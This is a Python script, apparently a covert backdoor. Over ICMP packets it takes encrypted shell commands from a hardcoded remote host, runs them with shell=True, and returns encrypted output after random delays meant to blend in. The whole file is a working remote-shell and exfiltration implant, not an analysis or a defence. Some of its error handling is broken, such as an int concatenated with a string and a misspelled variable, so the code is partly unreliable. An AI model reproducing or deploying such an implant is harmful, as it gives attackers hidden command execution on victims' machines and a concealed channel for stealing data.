# -*- coding: utf-8 -*-
"""ICMP Server

"""


from scapy.all import *
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
import base64
import random
import subprocess
import os

#Create public and private key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

#sniff for ICMP packets
def get_packets(packet):
  global key
  global output

  if packet.haslayer(ICMP) and packet.haslayer(Raw):
    payload = packet[Raw].load
#If payload starts with key, decrypt as Fernet key
    if payload.startswith(b"KEY:"):
      encrypted_key = payload[4:]
      decode_key = base64.urlsafe_b64decode(encrypted_key)
      key = private_key.decrypt(decode_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(), label=None))
#If payload starts with MSG decrypt using Fernet key as message
    elif payload.startswith(b"MSG:") and key:
      encrypted_message = payload[4:]
      f = Fernet(key)
      decrypted_message = f.decrypt(encrypted_message).decode()
      if decrypted_message.startswith("cd "):
        try:
          os.chdir(decrypted_message[3:])
          output = os.getcwd()
        except FileNotFoundError as e:
          output = "Not Found " + str(e)
        except subprocess.CalledProcessError as e:
          output = e.returncode
        except Exception as e:
          output = "Unexpected error " + str(e)
      else:
        try:
          result = subprocess.run(decrypted_message, capture_output=True, text=True, shell=True)
          if result.returncode != 0:
            output = result.returncode + "\n" + result.stderr
          else:
            output = result.stdout
        except subprocess.CalledProcessError as e:
          outputj = e.returncode
        except FileNotFoundError as e:
          output = "Not Found " + str(e)
        except Exception as e:
          output = "Unexpected error " + str(e)
public_bytes = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)

def encode_message(message, key):
  f = Fernet(key)
  encoded = message.encode()
  encrypted_message = f.encrypt(encoded)
  return encrypted_message

#Change client ip
client_ip = "192.168.19.131"
#Send public key to client (Client must be started and listening before running server
packet = IP(dst=client_ip)/ICMP()/Raw(load=b"PUB:" + public_bytes)
send(packet, verbose =0)

sniff(filter="icmp and src " + client_ip, prn=get_packets, count = 1)

while True:
  sniff(filter="icmp and src " + client_ip, count = 1, prn=get_packets)
  packet = IP(dst=client_ip)/ICMP()/Raw(load=b"MSG:" + encode_message(output, key))
  rng = random.randint(1, 100)
  time.sleep(rng)
  send(packet, verbose = 0)